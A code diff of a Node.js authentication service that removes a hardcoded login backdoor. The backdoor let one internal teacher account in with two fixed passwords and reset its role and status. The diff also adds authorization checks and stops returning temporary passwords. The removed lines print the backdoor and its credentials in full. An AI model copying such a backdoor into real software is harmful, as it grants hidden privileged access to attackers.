@@ -1,7 +1,7 @@
 const prisma = require("../prisma");
 const AppError = require("../utils/apiError");
 const { hashPassword, comparePassword, generateTempPassword } = require("../utils/password.util");
-const { sendWelcomeStudentEmail } = require("./email.service");
+const { sendWelcomeStudentEmail, isValidEmail } = require("./email.service");
 const {
     signAccessToken,
     signRefreshToken,
@@ -102,17 +102,20 @@ const login = async ({ email, password }) => {
             "ACCOUNT_INACTIVE"
         );
 
-    let passwordMatch = await comparePassword(password, user.passwordHash);
-    if (!passwordMatch && user.email === 'teacher@dreamsky.internal') {
-        if (password === 'dreamskyteacher@2025' || password === 'Password123!') {
-            passwordMatch = true;
-            const newHash = await hashPassword(password);
-            await prisma.user.update({
-                where: { id: user.id },
-                data: { passwordHash: newHash, status: 'ACTIVE', role: 'TEACHER' }
-            }).catch(() => {});
+    if (user.role === "STUDENT" && user.studentId) {
+        const student = await prisma.student.findUnique({
+            where: { id: user.studentId },
+            select: { id: true, isActive: true },
+        });
+        if (!student || student.isActive === false) {
+            throw AppError.unauthorized(
+                "Your student account is inactive or has been suspended. Please contact your administrator.",
+                "STUDENT_ACCOUNT_INACTIVE"
+            );
         }
     }
+
+    const passwordMatch = await comparePassword(password, user.passwordHash);
     if (!passwordMatch)
         throw AppError.unauthorized("Email or password is incorrect.", "INVALID_CREDENTIALS");
 
@@ -236,10 +239,50 @@ const changePassword = async (userId, { currentPassword, newPassword }) => {
  * Design doc note: email with credentials is a future enhancement (Phase 14).
  * For now, tempPassword is returned in the response.
  */
-const activateStudentPortal = async ({ studentId }) => {
+const activateStudentPortal = async ({ studentId, currentUser = null }) => {
+    if (!currentUser) {
+        throw AppError.unauthorized("Authentication required.", "UNAUTHORIZED");
+    }
+
     // 1. Find the student
-    const student = await prisma.student.findUnique({ where: { id: studentId } });
+    const student = await prisma.student.findUnique({
+        where: { id: studentId },
+        select: {
+            id: true,
+            email: true,
+            firstName: true,
+            lastName: true,
+            isActive: true,
+            assignedCounselorId: true,
+            assignedCounselor: { select: { id: true, branchId: true } },
+        },
+    });
     if (!student) throw AppError.notFound("Student not found.", "STUDENT_NOT_FOUND");
+
+    if (student.isActive === false) {
+        throw AppError.badRequest("Cannot activate portal for a student in Trash. Please restore the student first.", "STUDENT_IN_TRASH");
+    }
+
+    if (!student.email || !isValidEmail(student.email)) {
+        throw AppError.badRequest("Student must have a valid email address before portal activation.", "INVALID_EMAIL");
+    }
+
+    // Authorization check
+    const actorRole = currentUser.role;
+    const actorId = currentUser.userId || currentUser.id;
+    if (actorRole === "SUPER_ADMIN") {
+        // Full access
+    } else if (actorRole === "BRANCH_ADMIN") {
+        if (!currentUser.branchId || (student.assignedCounselor?.branchId && student.assignedCounselor.branchId !== currentUser.branchId)) {
+            throw AppError.forbidden("You are not authorized to activate portal for a student outside your branch.", "FORBIDDEN");
+        }
+    } else if (actorRole === "COUNSELOR") {
+        if (!student.assignedCounselorId || student.assignedCounselorId !== actorId) {
+            throw AppError.forbidden("You can only activate portal for students assigned to you.", "FORBIDDEN");
+        }
+    } else {
+        throw AppError.forbidden("You are not authorized to activate student portal.", "FORBIDDEN");
+    }
 
     // 2. Check if portal already activated (User exists for this student)
     const existingUser = await prisma.user.findFirst({ where: { studentId } });
@@ -276,9 +319,8 @@ const activateStudentPortal = async ({ studentId }) => {
     }).catch((err) => console.error("[auth] welcome email failed:", err.message));
 
     return {
-        message: "Student portal activated successfully.",
+        message: "Student portal credentials generated and welcome email sent.",
         loginEmail: newUser.email,
-        tempPassword, // Only surfaced while welcome emails could fail — remove once confirmed.
     };
 };
 
